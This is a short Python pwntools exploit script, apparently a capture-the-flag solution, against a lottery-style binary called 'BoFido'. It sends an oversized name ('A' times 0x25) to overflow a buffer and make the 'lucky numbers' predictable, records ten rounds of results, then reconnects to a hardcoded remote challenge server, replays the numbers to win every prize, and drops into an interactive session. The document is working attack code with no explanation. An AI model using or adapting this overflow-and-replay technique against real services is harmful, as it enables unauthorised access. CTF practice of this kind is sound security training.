from pwn import *

file = "./BoFido"  
elf = ELF(file)

context(arch=elf.arch, os='linux')


a, b, c = 0, 0, 0
j = [[],[],[]]


def play_round(io, round_num):
    global a, b, c
    
    
    if round_num == 1:
        
        io.sendlineafter(b'please choose your numbers:\n', b"1 2 3")
    else:
       
        io.sendlineafter(b'please choose your numbers:\n', f"{a} {b} {c}".encode())
    
    
    io.recvuntil(b"The lucky number is: ")
    line = io.recvline().decode().strip()
    a, b, c = map(int, line.split())

    prize = io.recvuntil(b"Congratulations! You won", drop=True)
    j[0].append(a)
    j[1].append(b)
    j[2].append(c)
    success(f"Round {round_num}: Lucky numbers {j[0][round_num-1]} {j[1][round_num-1]} {j[2][round_num-1]} - {prize.decode()}")




if args.REMOTE:
    io = remote('39.107.58.236', 44623)
else:
    io = process(file)


io.recvuntil(b"Enter your name:")
io.sendline(b'A'*0x25)

for round_num in range(1,11):
    play_round(io, round_num)


if args.REMOTE:
    io = remote('39.107.58.236', 44623)
else:
    io = process(file)
    
io.recvuntil(b"Enter your name:")
io.sendline(b'A'*0x25)

for i in range(10):
    io.sendlineafter(b'please choose your numbers:\n', f"{j[0][i]} {j[1][i]} {j[2][i]}".encode())
    io.recvuntil("Congratulations! You won the first prize!",timeout=2)
    success(f"Round {i+1} , Pass")
    

io.recvuntil(b"You're so lucky! Here is your gift!", timeout=1)
io.interactive()